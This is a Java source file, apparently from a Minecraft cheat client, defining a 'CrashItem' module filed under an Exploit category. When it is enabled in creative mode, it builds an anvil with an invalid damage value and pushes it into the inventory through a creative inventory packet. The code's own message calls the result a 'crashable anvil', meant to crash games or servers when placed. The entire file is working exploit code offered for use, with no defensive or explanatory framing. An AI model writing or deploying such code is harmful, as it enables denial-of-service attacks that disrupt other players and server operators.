package complex.module.impl.exploit;

import complex.command.Command;
import complex.module.Category;
import complex.module.Module;
import net.minecraft.init.Blocks;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;

public class CrashItem extends Module {
    public CrashItem() {
        super("CrashItem", null, 0, 0, Category.Exploit);
    }

    @Override
    public void onEnable() {
        if (!mc.thePlayer.capabilities.isCreativeMode) {
            Command.sendChatMessageError("Creative mode only.");
            toggle();
            return;
        }
        ItemStack stack = new ItemStack(Item.getItemFromBlock(Blocks.ANVIL));
        stack.setItemDamage(1337);
        stack.setStackDisplayName("Place me Â§c<3");
        mc.getConnection().sendPacket(new CPacketCreativeInventoryAction(36, stack));
        mc.thePlayer.closeScreen();
        Command.sendChatMessageInfo("Crashable anvil created.");
        super.onEnable();
    }
}
